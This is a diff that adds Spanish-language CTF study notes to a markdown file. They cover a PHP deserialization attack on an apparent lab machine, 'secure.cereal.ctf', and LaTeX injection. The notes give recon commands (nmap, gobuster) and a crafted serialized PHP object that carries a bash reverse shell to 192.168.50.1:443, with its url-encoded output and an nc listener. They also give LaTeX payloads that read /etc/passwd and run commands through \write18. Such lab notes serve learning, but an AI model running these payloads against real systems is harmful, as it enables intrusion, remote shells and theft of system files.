@@ -806,4 +806,82 @@ if __name__ == "__main__":
     print(users)
 
 ```
+# 14. [[deserialization attack]]
+arp-scan -I eno2 --localnet --ignoredups -> *para escanear ip's en la interface eno2*
 
+**nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.56.103 -oG allports**
+
+gobuster dir -u http://192.168.56.103 -w "[wordlist]" -t 20 | hay directorios /blog y /admin
+
+gobuster vhost -u http://192.168.53.103 -w "[wordlist]"  | analizo los subdominios
+
+tcpdump -i eno2 icmp -n
+
+**en este caso en el payload se puede ver un objeto serializado y que esta url encodeado**: tiene propiedades
+el servidor lo deserializa y lo interpreta, entonces ahi es donde es una posible via para inyectar nuestro codigo malicioso
+
+*formato url-encodeado (como viaja normalmente el payload):* 
+obj=O%3A8%3A%22pingTest%22%3A1%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A6%3A%22whoami%22%3B%7D&ip=whoami
+
+*formato sin url-encodeado*
+obj=O:8:"pingTest":1:{s:9:"ipAddress";s:6:"whoami";}&ip=whoami
+
+tiene una estructura tal que asi: O:<longitud_nombre_clase>:"<nombre_clase>":<num_propiedades>:{ ... }
+
+hay un directorio llamado **/back_en** (descubierto usando fuzzing)
+luego se pueden buscar archivos php dentro de este directorio descubierto:
+`gobuster dir -u http://secure.cereal.ctf:44441/back_en -w \[wordlist] -t 20 -x php
+
+buscando todo tipos en archivos en la ruta /back_en se encuentra index.php.bak
+http://secure.cereal.ctf:44441/back_en/index.php.bak
+
+luego de analizar como se verifica el input del usuario puedo empezar a armar mi propio objeto serializado malicioso
+
+para tener un objeto como el que se esta enviando en la maquina se puede usar la funcion serialize de php.
+
+```php
+<?php
+class pingTest {
+  public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.50.1/443 0>&1";
+  public $isValid = True;
+  public $output = "";
+}
+
+echo urlencode(serialize(new pingTest));
+
+?>
+```
+output: 
+O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A52%3A%22%3B+bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.50.1%2F443+0%3E%261%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1
+
+ahora poniendome en escucha en puerto 443 deberia entrar a la maquina interactiva
+`nc -nlvp 443
+
+##### recap:
+sabiendo como son las clases del codigo fuente y como se serializa el objeto es posible imitar la funcionalidad del codigo fuente usando la misma clase pero con distinto contenido para crear el objeto malicioso (pero es necesario conocer la clase original)
+
+IIFE: An IIFE (Immediately Invoked Function Expression) is _an idiom in which a JavaScript function runs as soon as it is defined_.
+
+# 15. [[inyecciones LaTex]]
+se inyecta la vulnerabilidad en un documento PDF
+
+para leer los contenidos de un archivo usando LaTex: 
+\input{/etc/passwd}
+\include{somefile} // para archivos .tex
+
+pero en esta maquina, los strings input o include estan **blacklisted**, por lo que no podran usarse sino sera sanitizadas
+
+con \write18{comando} es posible ejecutar cualquier tipo de comando con latex
+en esta maquina como se usa pdflatex con -shell-escape entonces esta habilitando el \write18
+
+"include e input no son las unicas keywords que pueden generar vulnerabilidades con latex"
+
+se puede leer una linea de un archivo con el siguiente codigo de latex:
+```latex
+\newread\file
+\openin\file=/etc/issue
+\read\file to\line
+\text{\line}
+\closein\file
+```
+entonces construyo script de bash para que me muestre todas las lineas de una archivo que le indique
